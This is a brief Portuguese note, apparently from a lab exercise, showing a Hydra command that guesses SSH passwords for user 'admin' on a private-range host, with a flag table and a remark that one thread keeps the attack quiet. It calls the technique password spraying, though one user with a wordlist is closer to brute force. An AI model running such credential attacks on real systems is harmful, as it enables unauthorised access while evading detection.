
# Password Spraying com Hydra

## Objetivo

Testar credenciais fracas no serviço SSH.

---

# Comando

```bash
hydra -l admin -P senhas_spray.txt -t 1 -V 192.168.56.105 ssh
````

---

# Explicação dos parâmetros

| Parâmetro | Função             |
| --------- | ------------------ |
| `-l`      | Usuário            |
| `-P`      | Wordlist de senhas |
| `-t 1`    | Apenas uma thread  |
| `-V`      | Modo verboso       |

---

# Observações

O uso de apenas uma thread reduz ruídos e tentativas simultâneas.

````

---
